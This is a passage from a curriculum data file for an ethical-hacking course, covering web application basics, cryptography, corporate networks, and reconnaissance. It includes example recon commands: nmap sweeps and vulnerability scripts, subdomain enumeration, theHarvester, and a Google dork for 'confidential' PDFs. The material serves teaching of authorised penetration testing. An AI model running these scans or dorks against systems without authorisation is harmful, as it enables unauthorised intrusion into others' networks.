          "Part 1: OS structure, editions, and basic navigation",
          "Part 2: System configuration, Control Panel, settings",
          "Part 3: User management, UAC, and administrative tools",
        ],
      },
    ],
  },

  // ============================================================
  // M4: Application Basics
  // ============================================================
  {
    id: "m4",
    name: "M4: Application Basics",
    shortName: "App Basics",
    month: 2,
    weeks: [5],
    description:
      "How modern web/mobile applications are actually built — frontend, backend, APIs, databases, sessions, and auth. Every web attack in M9/M10 is exploiting a gap in one of these building blocks, so understanding how they're supposed to work is the prerequisite for understanding how they break.",
    estimatedHours: 10,
    outcomes: [
      "Differentiate web, mobile, and thick-client applications and their attack surfaces",
      "Describe the SDLC and where security testing fits into it",
      "Explain how sessions/cookies maintain login state, and the flags that secure them",
      "Compare authentication methods (password, MFA, OAuth2) and authorization models (RBAC/ABAC)",
    ],
    resources: [
      { title: "OWASP Session Management Cheat Sheet", url: "https://cheatsheetseries.owasp.org", type: "link" },
      { title: "PortSwigger Web Academy Intro", url: "https://portswigger.net/web-security", type: "platform" },
    ],
    topics: [
      {
        id: "m4-1",
        moduleId: "m4",
        number: 54,
        title: "Web vs Mobile vs Thick Client Applications",
        type: "theory",
        week: 5,
        description:
          "Each application category has a different attack surface: web apps run mostly server-side logic behind HTTP, mobile apps ship logic to the device, thick clients run natively with direct OS/API access.",
        keyPoints: [
          "Web apps: browser-rendered, server does most of the work, tested via HTTP proxy (Burp)",
          "Mobile apps: logic partly on-device (APK/IPA), tested via static analysis + intercepting the app's API traffic",
          "Thick clients: full native desktop apps, often talk directly to a database or custom protocol, tested via binary/traffic analysis",
        ],
      },
      {
        id: "m4-2",
        moduleId: "m4",
        number: 55,
        title: "Software Development Life Cycle (SDLC)",
        type: "theory",
        week: 5,
        description:
          "The SDLC is the structured process software goes through from idea to retirement — security testing (SAST/DAST/pentesting) should be embedded at multiple stages, not bolted on at the end.",
        keyPoints: [
          "Phases: Requirements → Design → Development → Testing → Deployment → Maintenance",
          "'Shift-left' security means testing earlier (code review, SAST) rather than only at the end (pentest before launch)",
          "DevSecOps integrates automated security scanning directly into the CI/CD pipeline",
        ],
      },
      {
        id: "m4-3",
        moduleId: "m4",
        number: 56,
        title: "Frontend (HTML, CSS, JavaScript, React, Angular)",
        type: "theory",
        week: 5,
        description:
          "The frontend is everything that runs in the user's browser — and because it's fully visible/modifiable by the user, it must never be the only line of defence (client-side validation is a UX feature, not a security control).",
        keyPoints: [
          "HTML structures content, CSS styles it, JavaScript adds interactivity/logic",
          "React/Angular/Vue are frameworks for building complex, component-based UIs (Single Page Applications)",
          "Any validation or 'hidden' logic written in JS can be read and bypassed by an attacker using DevTools",
        ],
      },
      {
        id: "m4-4",
        moduleId: "m4",
        number: 57,
        title: "Backend (Node.js, Python/Django/Flask, Java, PHP)",
        type: "theory",
        week: 5,
        description:
          "The backend runs server-side, handling business logic, authentication, and database access — this is where the real security enforcement must happen.",
        keyPoints: [
          "Node.js (JavaScript), Python (Django/Flask), Java (Spring), PHP — different languages, same responsibilities",
          "Backend frameworks often include built-in protections (CSRF tokens, ORM query parameterisation) that must not be disabled",
        ],
      },
      {
        id: "m4-5",
        moduleId: "m4",
        number: 58,
        title: "APIs - REST vs SOAP, HTTP Methods (GET/POST/PUT/DELETE), Status Codes",
        type: "theory",
        week: 5,
        description:
          "APIs are how frontend, mobile, and third parties talk to the backend — REST (lightweight, JSON, stateless) has largely replaced the older, more rigid SOAP (XML-based) standard.",
        keyPoints: [
          "GET (read), POST (create), PUT (replace), PATCH (partial update), DELETE (remove)",
          "2xx = success, 3xx = redirect, 4xx = client error (401 unauthenticated, 403 forbidden, 404 not found), 5xx = server error",
          "REST APIs are the most common target for the API-security topics covered in M10",
        ],
        terminalCommands: ["curl -X GET https://api.example.com/users/1", "curl -I https://example.com"],
      },
      {
        id: "m4-6",
        moduleId: "m4",
        number: 59,
        title: "Databases - SQL vs NoSQL (MySQL, PostgreSQL, MongoDB)",
        type: "theory",
        week: 5,
        description:
          "SQL databases (MySQL, PostgreSQL) store structured data in tables with a fixed schema; NoSQL databases (MongoDB) store flexible, often JSON-like documents.",
        keyPoints: [
          "SQL injection (M9) targets SQL databases via unsanitised query input",
          "NoSQL injection targets MongoDB-style query operators (e.g. $ne, $gt) instead of SQL syntax",
          "ORMs (Object-Relational Mappers) reduce (but don't eliminate) injection risk via parameterised queries",
        ],
      },
      {
        id: "m4-7",
        moduleId: "m4",
        number: 60,
        title: "Sessions & Cookies (HttpOnly, Secure, SameSite attributes)",
        type: "theory",
        week: 5,
        description:
          "Cookies/session tokens maintain login state across otherwise-stateless HTTP requests — missing security flags on that cookie is how session hijacking becomes possible.",
        keyPoints: [
          "Session hijacking: attacker steals/predicts a session ID to impersonate a user without credentials",
          "HttpOnly: blocks JavaScript from reading the cookie (mitigates theft via XSS)",
          "Secure: cookie only ever sent over HTTPS",
          "SameSite=Strict: blocks the cookie being sent on cross-site requests (mitigates CSRF)",
        ],
        terminalCommands: ["Set-Cookie: sessionID=abc123xyz456; HttpOnly; Secure; SameSite=Strict;"],
      },
      {
        id: "m4-8",
        moduleId: "m4",
        number: 61,
        title: "Authentication Methods (Password, MFA, OAuth 2.0, Form-based)",
        type: "theory",
        week: 5,
        description:
          "Authentication answers 'are you who you claim to be?' — modern systems combine multiple factors and increasingly delegate identity via OAuth2 rather than handling passwords directly.",
        keyPoints: [
          "Three factors: Knowledge (password/PIN), Possession (token/app), Inherence (biometrics)",
          "MFA combines 2+ factors — e.g. password + time-sensitive mobile code",
          "OAuth2 uses access tokens instead of a shared username/password — misconfigured redirect URIs are a common vuln class",
          "Adaptive/risk-based authentication adds extra checks for unusual login context (new device/location)",
        ],
      },
      {
        id: "m4-9",
        moduleId: "m4",
        number: 62,
        title: "Authorization - RBAC & ABAC",
        type: "theory",
        week: 5,
        description:
          "Authorization answers 'what are you allowed to do?' — a completely separate question from authentication, and the one Broken Access Control (M9) exploits when it's implemented incorrectly.",
        keyPoints: [
          "RBAC (Role-Based): permissions tied to a role, e.g. 'Manager' can approve expense reports",
          "ABAC (Attribute-Based): dynamic decisions based on attributes, e.g. age-verification for a purchase",
          "Workflow: authenticate → identify roles/attributes → compare against policy → grant/deny → log",
          "Best practice: principle of least privilege + regular access audits",
        ],
      },
      {
        id: "m4-10",
        moduleId: "m4",
        number: 63,
        title: "Lab: Inspect & manipulate session cookies with DevTools",
        type: "lab",
        week: 5,
        description:
          "Use browser DevTools to view, understand, and tamper with a site's session cookies — the manual-testing precursor to the session-hijacking/CSRF attacks covered later.",
        keyPoints: [
          "Open DevTools (F12) → Application/Storage tab → Cookies to view all flags set on a cookie",
          "Check for missing HttpOnly/Secure/SameSite flags on any session cookie",
          "Try editing a cookie value directly in DevTools and reloading to observe the app's response",
        ],
      },
    ],
  },

  // ============================================================
  // M5: Cryptography Basics
  // ============================================================
  {
    id: "m5",
    name: "M5: Cryptography Basics",
    shortName: "Cryptography",
    month: 2,
    weeks: [5],
    description:
      "Cryptography is how confidentiality and integrity are actually enforced technically — and 'Cryptographic Failures' is its own OWASP Top 10 category (A02) because encoding, encryption, and hashing get confused for each other constantly. This module makes the distinction permanent.",
    estimatedHours: 10,
    outcomes: [
      "Clearly distinguish encoding, encryption, and hashing and when each is (mis)used",
      "Explain symmetric vs asymmetric cryptography and name common algorithms of each",
      "Identify weak hashing (MD5/SHA1) vs strong password hashing (bcrypt/Argon2)",
      "Describe how digital signatures and PKI/certificates establish trust",
      "Generate and use an RSA keypair with OpenSSL",
    ],
    resources: [
      { title: "CryptoHack.org", url: "https://cryptohack.org", type: "platform" },
      { title: "OWASP Cryptographic Failures", url: "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/", type: "link" },
    ],
    topics: [
      {
        id: "m5-1",
        moduleId: "m5",
        number: 64,
        title: "Encoding vs Encryption vs Hashing - Key Differences & When Used",
        type: "theory",
        week: 5,
        description:
          "The single most confused trio in security: encoding is reversible with no key, encryption is reversible only with a key, and hashing is not reversible at all.",
        keyPoints: [
          "Encoding: reformats data, no security value on its own — Base64('Hello') = SGVsbG8=",
          "Encryption: scrambles data with a secret key, reversible only if you have that key",
          "Hashing: one-way, fixed-length output — SHA-256('Hello') always produces the same fixed string, and changing one letter changes the whole hash",
          "OWASP A02 'Cryptographic Failures' is largely caused by treating one of these as if it were another",
        ],
      },
      {
        id: "m5-2",
        moduleId: "m5",
        number: 65,
        title: "Common Encoding Schemes (Base64, URL encoding, HTML encoding)",
        type: "theory",
        week: 5,
        description:
          "Encoding schemes exist to safely represent data in a different format (e.g. binary-safe text, or characters safe for a URL) — never to hide or protect it.",
        keyPoints: [
          "Base64: encodes binary data as ASCII text, commonly seen in Basic Auth headers and Burp's Decoder tool",
          "URL encoding: escapes special characters for safe inclusion in a URL — space becomes %20",
          "HTML encoding: escapes characters with HTML meaning (< becomes &lt;) — the core defence against XSS",
        ],
      },
      {
        id: "m5-3",
        moduleId: "m5",
        number: 66,
        title: "Symmetric Cryptography (AES, DES, 3DES, key exchange problem)",
        type: "theory",
        week: 5,
        description:
          "Symmetric crypto uses the same key to encrypt and decrypt — fast, but both parties need the same secret key, which creates the 'key exchange problem' solved by asymmetric crypto.",
        keyPoints: [
          "AES (Advanced Encryption Standard): the modern standard, used in Wi-Fi (WPA2/3), file storage, corporate comms",
          "DES/3DES: older, now considered weak/deprecated (DES has a trivially small 56-bit key)",
          "Use cases: encrypting data at rest, VPN tunnels, disk encryption (BitLocker uses AES)",
        ],
        terminalCommands: [
          "from cryptography.fernet import Fernet",
          "key = Fernet.generate_key()",
          "Fernet(key).encrypt(b'secret message')",
        ],
      },
      {
        id: "m5-4",
        moduleId: "m5",
        number: 67,
        title: "Asymmetric Cryptography (RSA, ECC, public/private key pair)",
        type: "theory",
        week: 5,
        description:
          "Asymmetric crypto uses a mathematically-linked key pair — a public key anyone can use to encrypt, and a private key only the owner holds to decrypt — solving the symmetric key-exchange problem.",
        keyPoints: [
          "RSA: based on the difficulty of factoring large primes; widely used for TLS and digital signatures",
          "ECC (Elliptic Curve Cryptography): smaller keys than RSA for equivalent security, used in modern TLS and cryptocurrency",
          "Use cases: HTTPS/TLS handshakes, secure email (PGP), digital signatures, SSH key auth",
        ],
      },
      {
        id: "m5-5",
        moduleId: "m5",
        number: 68,
        title: "Hashing Algorithms (MD5, SHA-1, SHA-256, bcrypt, Argon2)",
        type: "theory",
        week: 5,
        description:
          "Not all hashes are equal for password storage — general-purpose hashes (MD5/SHA1/SHA256) are fast, which is exactly wrong for passwords; bcrypt/Argon2 are deliberately slow and salted.",
        keyPoints: [
          "MD5, SHA-1: broken/crackable, and offer no built-in salting — never use for password storage",
          "SHA-256: still cryptographically fine for integrity checks (file hashes) but too fast for password storage",
          "bcrypt, Argon2: purpose-built for passwords — deliberately slow, with automatic per-hash salting",
        ],
        terminalCommands: [
          "import bcrypt",
          "hashed = bcrypt.hashpw(b'myPassword', bcrypt.gensalt())",
          "bcrypt.checkpw(b'myPassword', hashed)",
        ],
      },
      {
        id: "m5-6",
        moduleId: "m5",
        number: 69,
        title: "Digital Signatures (how they work, signing & verification)",
        type: "theory",
        week: 5,
        description:
          "A digital signature proves both integrity and authenticity — the sender signs data with their private key, and anyone can verify it using the sender's public key.",
        keyPoints: [
          "Signing: hash the message, then encrypt that hash with the signer's private key",
          "Verification: decrypt the signature with the sender's public key and compare to a fresh hash of the message",
          "Used in code-signing (verifying software hasn't been tampered with) and TLS certificates",
        ],
      },
      {
        id: "m5-7",
        moduleId: "m5",
        number: 70,
        title: "Certificates & PKI (X.509, CA, chain of trust, TLS handshake)",
        type: "theory",
        week: 5,
        description:
          "PKI (Public Key Infrastructure) is the system of Certificate Authorities (CAs) that lets your browser trust that a public key really belongs to the site claiming it.",
        keyPoints: [
          "X.509 certificates bind a public key to an identity (domain name), signed by a trusted CA",
          "Chain of trust: your OS/browser trusts a small set of Root CAs, which sign Intermediate CAs, which sign site certificates",
          "TLS handshake (simplified): client/server agree on cipher suite → server presents certificate → key exchange → encrypted session begins",
        ],
      },
      {
        id: "m5-8",
        moduleId: "m5",
        number: 71,
        title: "Key Exchange (Diffie-Hellman, ECDH)",
        type: "theory",
        week: 5,
        description:
          "Key exchange protocols let two parties agree on a shared secret over an untrusted channel without ever transmitting the secret itself.",
        keyPoints: [
          "Diffie-Hellman: both parties combine their own private value with a shared public value to independently derive the same secret",
          "ECDH: the elliptic-curve variant of Diffie-Hellman, used throughout modern TLS for forward secrecy",
        ],
      },
      {
        id: "m5-9",
        moduleId: "m5",
        number: 72,
        title: "Lab: Manually encode/decode strings in Base64 & URL encoding",
        type: "lab",
        week: 5,
        description:
          "Practice converting strings between plaintext, Base64, and URL encoding by hand before relying on tooling — this builds the intuition needed to instantly recognise encoded data during recon/exploitation.",
        keyPoints: [
          "Encode 5 different strings to Base64, then decode them back without a tool first, then verify with CyberChef",
          "URL-encode a string containing special characters (&, =, /, space) and confirm each substitution",
          "Recognise the telltale '=' padding characters and character set of Base64 output",
        ],
        terminalCommands: [
          "echo -n 'Hello World' | base64",
          "echo 'SGVsbG8gV29ybGQ=' | base64 -d",
        ],
      },
      {
        id: "m5-10",
        moduleId: "m5",
        number: 73,
        title: "Lab: Generate RSA keypair with OpenSSL, sign & verify a file",
        type: "lab",
        week: 5,
        description:
          "Hands-on OpenSSL lab — generate a real RSA keypair, then use it to sign and verify a file's digital signature.",
        keyPoints: [
          "Generate a private key first, then derive the public key from it",
          "Sign a file's hash with the private key; verify the signature using only the public key",
          "Confirm that tampering with the file after signing causes verification to fail",
        ],
        terminalCommands: [
          "openssl genrsa -out private.pem 2048",
          "openssl rsa -in private.pem -pubout -out public.pem",
          "openssl dgst -sha256 -sign private.pem -out file.sig file.txt",
          "openssl dgst -sha256 -verify public.pem -signature file.sig file.txt",
        ],
      },
    ],
  },

  // ============================================================
  // M6: Corporate Networks
  // ============================================================
  {
    id: "m6",
    name: "M6: Corporate Networks",
    shortName: "Corporate Networks",
    month: 2,
    weeks: [6],
    description:
      "Real engagements target corporate environments, not standalone machines. This module covers how organisations actually segment, defend, and manage their internal networks — DMZ, VLANs, Active Directory, Zero Trust — the terrain every later recon and exploitation module assumes you understand.",
    estimatedHours: 12,
    outcomes: [
      "Explain corporate network architecture and common topologies",
      "Describe DMZ design and why public-facing services are isolated there",
      "Understand VLANs, segmentation, and their security benefits",
      "Explain Active Directory's role and Zero Trust principles",
      "Compare EDR, IDS/IPS, WAF, and NGFW as layered defences",
    ],
    resources: [
      { title: "TryHackMe AD Basics", url: "https://tryhackme.com", type: "platform" },
      { title: "draw.io", url: "https://app.diagrams.net", type: "tool" },
      { title: "BloodHound", url: "https://bloodhound.readthedocs.io", type: "tool" },
    ],
    topics: [
      {
        id: "m6-1",
        moduleId: "m6",
        number: 74,
        title: "Corporate Network Architecture Overview",
        type: "theory",
        week: 6,
        description:
          "Think of a corporate network like an office building: rooms are departments, corridors are the LAN, the internet is the outside world, and firewalls are the security guards controlling entry.",
        keyPoints: [
          "Benefits: shared resources (drives/printers), centralised storage/backup, controlled/restricted access (e.g. payroll systems), remote access via VPN",
          "Corporate network security = the practices, policies, and technologies safeguarding the network from unauthorised access and breaches",
        ],
      },
      {
        id: "m6-2",
        moduleId: "m6",
        number: 75,
        title: "Network Topologies in Enterprise (Segmented, Flat, Hub-and-Spoke)",
        type: "theory",
        week: 6,
        description:
          "How a network's physical/logical layout is designed shapes both its performance and its blast radius when a single host is compromised.",
        keyPoints: [
          "Flat network: everything on one broadcast domain — simplest, but a single compromised host can reach everything",
          "Segmented network: split into zones/VLANs, limiting lateral movement if one segment is breached",
          "Hub-and-spoke: a central site connects to multiple branch sites, common in multi-office organisations",
        ],
      },
      {
        id: "m6-3",
        moduleId: "m6",
        number: 76,
        title: "VLANs (Virtual LANs) & Network Segmentation",
        type: "theory",
        week: 6,
        description:
          "A VLAN is logical segmentation into isolated broadcast domains — like adding invisible walls between rooms in the same building.",
        keyPoints: [
          "Why: security segmentation, reduced broadcast traffic, logical grouping (HR/Finance/IT), better access control",
          "Switch ports are assigned VLAN IDs; a Layer-3 device is needed for inter-VLAN routing",
          "802.1Q is the standard tagging protocol used on trunk links carrying multiple VLANs",
          "Example: VLAN 10=HR, VLAN 20=IT, VLAN 30=Finance — isolated from each other unless explicitly routed",
        ],
      },
      {
        id: "m6-4",
        moduleId: "m6",
        number: 77,
        title: "DMZ (Demilitarised Zone) - Purpose & Design",
        type: "theory",
        week: 6,
        description:
          "A DMZ is an isolated subnet sitting between the trusted internal LAN and the untrusted internet, hosting only the services that must be reachable from outside.",
        keyPoints: [
          "Typical 3-legged firewall setup: Internet interface, Internal LAN interface, DMZ interface",
          "Traffic rules: Internet→DMZ allowed; DMZ→Internal strictly restricted; Internal→DMZ allowed (admin); Internet→Internal blocked",
          "Common DMZ services: web servers, mail servers (SMTP), DNS servers, VPN gateways, reverse proxies",
        ],
      },
      {
        id: "m6-5",
        moduleId: "m6",
        number: 78,
        title: "VPN in Corporate Environments (site-to-site, remote access)",
        type: "theory",
        week: 6,
        description:
          "Corporate VPNs create an encrypted tunnel hiding traffic content and routing it as if the remote device were physically on the internal network.",
        keyPoints: [
          "Remote Access VPN: individual employees connect in from home/travel",
          "Site-to-Site VPN: permanently links two office networks together over the internet",
          "Flow: connect to VPN server → encrypt traffic → travel securely → server forwards to destination → response returns via tunnel",
        ],
      },
      {
        id: "m6-6",
        moduleId: "m6",
        number: 79,
        title: "Active Directory - Structure, Users, Groups, GPO, Trust Relationships",
        type: "theory",
        week: 6,
        description:
          "Active Directory is Microsoft's directory service for centrally managing users, computers, and permissions across an entire corporate Windows network.",
        keyPoints: [
          "Analogy: AD = receptionist, login = authentication (badge), access = authorization (restricted floors)",
          "Structure: Domains → Trees → Forests, with Organizational Units (OUs) grouping users/computers",
          "Group Policy Objects (GPOs) push centralised security/config settings to domain-joined machines",
          "AD is the single highest-value target in most corporate pentests — 'Domain Admin' is the classic goal",
        ],
      },
      {
        id: "m6-7",
        moduleId: "m6",
        number: 80,
        title: "Zero Trust Architecture (never trust, always verify)",
        type: "theory",
        week: 6,
        description:
          "Zero Trust assumes no user or device is trusted by default, even inside the traditional network perimeter — every request is re-verified.",
        keyPoints: [
          "Key principles: Always Verify, Least Privilege Access, Assume Breach",
          "Components: IAM (authenticate/authorize every request), Micro-Segmentation (limits lateral movement), Real-Time Monitoring",
          "Named tools in practice: Palo Alto Prisma Access, Okta Identity Cloud, Microsoft Entra ID (Azure AD)",
        ],
      },
      {
        id: "m6-8",
        moduleId: "m6",
        number: 81,
        title: "Endpoint Security (EDR, AV, Defender)",
        type: "theory",
        week: 6,
        description:
          "Endpoint security software runs directly on user devices/servers, providing the last line of defence once traffic has already reached the host.",
        keyPoints: [
          "Traditional AV: signature-based detection of known malware",
          "EDR (Endpoint Detection and Response): continuously gathers/analyses endpoint data in real time, detects behaviour traditional AV misses, can isolate an infected endpoint automatically",
          "Microsoft Defender integrates with Azure/O365/Intune for centralized enterprise management",
        ],
      },
      {
        id: "m6-9",
        moduleId: "m6",
        number: 82,
        title: "Intrusion Detection & Prevention (IDS/IPS) - Signature vs Anomaly",
        type: "theory",
        week: 6,
        description:
          "IDS/IPS monitor network traffic for malicious patterns — an IDS alerts, an IPS can also actively block the traffic in real time.",
        keyPoints: [
          "Signature-based detection: matches traffic against a database of known-bad patterns (fast, but misses novel attacks)",
          "Anomaly-based detection: flags deviations from a baseline of 'normal' behaviour (catches novel attacks, higher false-positive rate)",
          "IDS = passive/alerting only; IPS = sits inline and can actively drop malicious traffic",
        ],
      },
      {
        id: "m6-10",
        moduleId: "m6",
        number: 83,
        title: "Web Application Firewall (WAF) & Next-Gen Firewall (NGFW)",
        type: "theory",
        week: 6,
        description:
          "A WAF specifically inspects HTTP/HTTPS payloads (looking for SQLi/XSS patterns), while an NGFW is a broader, application-aware evolution of the traditional network firewall.",
        keyPoints: [
          "WAF sits in front of web apps, blocking malicious requests before they reach the app server",
          "NGFW combines deep packet inspection, IPS, and application-awareness, and can inspect encrypted HTTPS traffic",
          "Both are commonly bypassed via encoding/obfuscation tricks covered in the OWASP Top 10 modules",
        ],
      },
      {
        id: "m6-11",
        moduleId: "m6",
        number: 84,
        title: "VDI (Virtual Desktop Infrastructure)",
        type: "theory",
        week: 6,
        description:
          "VDI centrally hosts desktop environments on servers, streamed to end-user devices — keeping sensitive data on the server rather than the endpoint.",
        keyPoints: [
          "Key components: Centralized Servers, Hypervisor (VMware vSphere/Microsoft Hyper-V), Connection Broker, Remote Display Protocol (RDP, PCoIP, HDX)",
          "Benefits: remote work enablement, BYOD support, centralized IT management, data stays on the server",
          "Use cases: healthcare (telehealth/EHR), financial services (compliance), education",
        ],
      },
      {
        id: "m6-12",
        moduleId: "m6",
        number: 85,
        title: "Lab: Design a corporate network diagram in draw.io",
        type: "lab",
        week: 6,
        description:
          "Design a segmented corporate network diagram incorporating everything covered in this module — DMZ, VLANs, AD, and Zero Trust controls.",
        keyPoints: [
          "Include: internet edge firewall, DMZ with a public web server, internal VLANs (HR/IT/Finance), an AD domain controller",
          "Label every security control (firewall, IDS/IPS, WAF) at the point in the diagram where it sits",
          "Show traffic-flow arrows and annotate which flows are allowed/blocked between zones",
        ],
      },
    ],
  },

  // ============================================================
  // M7: Ethical Hacking Lifecycle & Recon
  // ============================================================
  {
    id: "m7",
    name: "M7: Ethical Hacking Lifecycle & Recon",
    shortName: "Recon & Lifecycle",
    month: 2,
    weeks: [6, 7],
    description:
      "The first two phases of every real engagement — reconnaissance and scanning — done properly before a single exploit is ever attempted. This module covers OSINT tradecraft, active scanning with Nmap, vulnerability scanning with Nessus, and how to structure a professional pentest report.",
    estimatedHours: 12,
    outcomes: [
      "Walk through the 5 phases of ethical hacking end to end",
      "Perform passive OSINT recon using WHOIS, Shodan, Netcraft, and Google Dorking",
      "Run and interpret Nmap scans for host/port/service/OS discovery",
      "Run a Nessus vulnerability scan and triage the results",
      "Structure a professional penetration test report",
    ],
    resources: [
      { title: "TryHackMe Nmap rooms", url: "https://tryhackme.com", type: "platform" },
      { title: "Nessus Essentials (free)", url: "https://www.tenable.com/products/nessus/nessus-essentials", type: "tool" },
      { title: "OSINT Framework", url: "https://osintframework.com", type: "link" },
      { title: "Shodan", url: "https://www.shodan.io", type: "tool" },
    ],
    topics: [
      {
        id: "m7-1",
        moduleId: "m7",
        number: 86,
        title: "5 Phases of Hacking (Recon, Scanning, Access, Maintain, Cover Tracks)",
        type: "theory",
        week: 6,
        description:
          "The classic 5-phase lifecycle every pentest and every real attack roughly follows — this course covers Recon and Scanning deeply here, Access/Exploitation in M9-M11, and touches Maintain/Cover Tracks conceptually.",
        keyPoints: [
          "1. Reconnaissance: gathering information (passive or active) before touching the target directly",
          "2. Scanning: identifying live hosts, open ports, and running services",
          "3. Gaining Access: exploiting a vulnerability to get a foothold",
          "4. Maintaining Access: persistence mechanisms to survive a reboot/reconnect",
          "5. Covering Tracks: clearing logs/artefacts (only ever relevant in authorised red-team engagements)",
        ],
      },
      {
        id: "m7-2",
        moduleId: "m7",
        number: 87,
        title: "Passive Recon - OSINT (WHOIS, Shodan, Google Dorks, LinkedIn, Netcraft)",
        type: "theory",
        week: 7,
        description:
          "Passive footprinting gathers information without directly touching the target — 'spying from a distance' using public sources only, so the target never sees you.",
        keyPoints: [
          "Shodan: search engine for internet-connected devices, e.g. hostname:\"example.com\"",
          "Netcraft: Site Report tool reveals subdomains, hosting, and OS fingerprinting",
          "WHOIS: reveals registrar, nameservers, and organisation details for a domain",
          "Google Dorking: site:example.com filetype:pdf \"confidential\" and similar operators find exposed data",
          "theHarvester gathers emails/employee names from public sources for social-engineering-aware recon",
        ],
        terminalCommands: [
          'site:example.com filetype:pdf "confidential"',
          "theHarvester -d example.com -l 200 -b linkedin",
          "nslookup",
        ],
      },
      {
        id: "m7-3",
        moduleId: "m7",
        number: 88,
        title: "Active Recon (Nmap, Traceroute, Banner Grabbing)",
        type: "theory",
        week: 7,
        description:
          "Active footprinting means directly interacting with the target — the target may notice this activity, so it must only ever be done with explicit authorisation and an agreed scope.",
        keyPoints: [
          "Ping sweeps and traceroute map live hosts and the network path to a target",
          "Banner grabbing reveals exact service versions directly from their response headers/banners",
          "Always obtain explicit permission, document all activity, and follow the agreed Rules of Engagement before any active recon",
        ],
        terminalCommands: [
          "ping example.com",
          "traceroute example.com",
          "nmap -sn 192.168.1.0/24",
          "nc <target> <port>",
        ],
      },
      {
        id: "m7-4",
        moduleId: "m7",
        number: 89,
        title: "Nmap: Host Discovery, Port Scanning, Version Detection, OS Detection",
        type: "theory",
        week: 7,
        description:
          "Nmap is the core scanning tool of the entire programme — host discovery, port scanning, service/version detection, and OS fingerprinting in one tool.",
        keyPoints: [
          "Host discovery/ping sweep finds which hosts on a range are alive before scanning each individually",
          "A full TCP scan across all 65535 ports is thorough but slow — often start with the default top-1000",
          "-sV detects service versions; -O attempts OS fingerprinting",
        ],
        terminalCommands: [
          "nmap -sn 192.168.0.0/24",
          "nmap -p- <target-ip>",
          "nmap -sV -O <target-ip>",
          "nmap -sU <target-ip>",
        ],
      },
      {
        id: "m7-5",
        moduleId: "m7",
        number: 90,
        title: "Nmap NSE Scripts for Service Enumeration",
        type: "theory",
        week: 7,
        description:
          "The Nmap Scripting Engine (NSE) extends Nmap with hundreds of scripts for deeper enumeration and even vulnerability detection.",
        keyPoints: [
          "--script vuln runs a broad set of vulnerability-detection scripts against discovered services",
          "Named vulnerability scripts include smb-vuln-ms17-010 and http-vuln-cve2020-3452",
          "Worked example: nmap -sV finds vsftpd 2.3.4 → cross-reference against CVE Details/Exploit-DB reveals CVE-2011-2523 (a known backdoor)",
        ],
        terminalCommands: [
          "nmap --script vuln <target>",
          "nmap --script=banner <target>",
          "nmap -sV -p 21,22,80 <target>",
        ],
      },
      {
        id: "m7-6",
        moduleId: "m7",
        number: 91,
        title: "Subdomain Enumeration (subfinder, amass, dnsx)",
        type: "theory",
        week: 7,
        description:
          "Subdomains often run older, forgotten, or less-hardened applications — enumerating them expands the attack surface dramatically beyond just the main domain.",
        keyPoints: [
          "subfinder/amass/dnsx passively query multiple sources (certificate transparency logs, DNS records, search engines) to enumerate subdomains at scale",
          "Complementary manual sources: Netcraft Site Report, crt.sh (certificate transparency), SecurityTrails, DNSDumpster",
        ],
        terminalCommands: [
          "subfinder -d example.com",
          "amass enum -d example.com",
          "dnsx -l subdomains.txt -a",
        ],
      },
      {
        id: "m7-7",
        moduleId: "m7",
        number: 92,
        title: "Vulnerability Scanning with Nessus & OpenVAS",
        type: "theory",
        week: 7,
        description:
          "Automated vulnerability scanners check discovered services against huge databases of known CVEs and misconfigurations, turning raw Nmap output into a prioritised risk list.",
        keyPoints: [
          "Process: find devices → check for weaknesses → assess risk (Critical/High/Medium/Low) → remediate",
          "Scan types: External vs Internal, Credentialed (deeper, logged-in) vs Non-Credentialed",
          "Nessus (commercial, free Essentials tier) vs OpenVAS (fully free/open-source alternative)",
          "Compliance scanning modes exist for standards like PCI-DSS, HIPAA, and NIST",
        ],
      },
      {
        id: "m7-8",
        moduleId: "m7",
        number: 93,
        title: "Privilege Escalation Theory - Vertical & Horizontal",
        type: "theory",
        week: 7,
        description:
          "Introduced conceptually here, and put into hands-on practice in M11 — privilege escalation is about gaining access beyond what you were originally granted.",
        keyPoints: [
          "Vertical: a lower-privileged user gains admin/root access (e.g. a regular user reaching an admin dashboard)",
          "Horizontal: a user accesses another same-level user's data (e.g. User A viewing User B's private files)",
          "Common enabling flaws: IDOR (predictable IDs), client-side role manipulation, missing server-side authorization checks",
        ],
      },
      {
        id: "m7-9",
        moduleId: "m7",
        number: 94,
        title: "Post-Exploitation (Persistence, Lateral Movement, Data Exfiltration, Covering Tracks)",
        type: "theory",
        week: 7,
        description:
          "What happens after an initial foothold is gained — covered here at a theory level, expanded hands-on in M11.",
        keyPoints: [
          "Persistence: mechanisms (scheduled tasks, registry Run keys, cron jobs) to survive reboot/reconnect",
          "Lateral movement: pivoting from the first compromised host to others in the network",
          "Data exfiltration: extracting data out of the target environment, often over covert channels",
          "Covering tracks: clearing logs/artefacts — relevant only within an authorised red-team scope",
        ],
      },
      {
        id: "m7-10",
        moduleId: "m7",
        number: 95,
        title: "Penetration Testing Report Structure",
        type: "theory",
        week: 7,
        description:
          "A finding is only as valuable as the report explaining it — this is the deliverable clients actually pay for and act on.",
        keyPoints: [
          "Required sections: Executive Summary (non-technical), Detailed Findings, Business Impact (CVSS scoring), Exploitation Difficulty (Easy/Medium/Hard), Remediation Recommendations, Strategic Recommendations",
          "Compliance-standard reporting frameworks differ: PCI-DSS, CREST, CERT, FedRAMP, CHECK each require different elements",
          "Best practices: know your audience, prioritise by severity/exploitability, include screenshots/PoC evidence, proofread scores carefully",
        ],
      },
      {
        id: "m7-11",
        moduleId: "m7",
        number: 96,
        title: "Rules of Engagement & Scoping (Legal & Ethical)",
        type: "theory",
        week: 7,
        description:
          "Before any active testing begins, scope and Rules of Engagement (RoE) must be explicitly agreed with the client/management — this is what makes the difference between a pentest and a crime.",
        keyPoints: [
          "RoE defines exactly what's in scope, what's off-limits, testing windows, and emergency contacts",
          "Discuss and define scope with management before any active technique is used",
          "Written authorisation must exist before touching any system you don't personally own",
        ],
      },
      {
        id: "m7-12",
        moduleId: "m7",
        number: 97,
        title: "Lab: Passive OSINT + Nmap scan + Nessus scan on a test target",
        type: "lab",
        week: 7,
        description:
          "An end-to-end recon exercise chaining everything in this module — passive OSINT, then an active Nmap scan, then a Nessus vulnerability scan against a lab VM (e.g. Metasploitable2).",
        keyPoints: [
          "Start passive: WHOIS, Shodan, Netcraft, Google Dorking on the test domain",
          "Move to active: full Nmap scan (-sV -O -p-) to enumerate live hosts/ports/services",
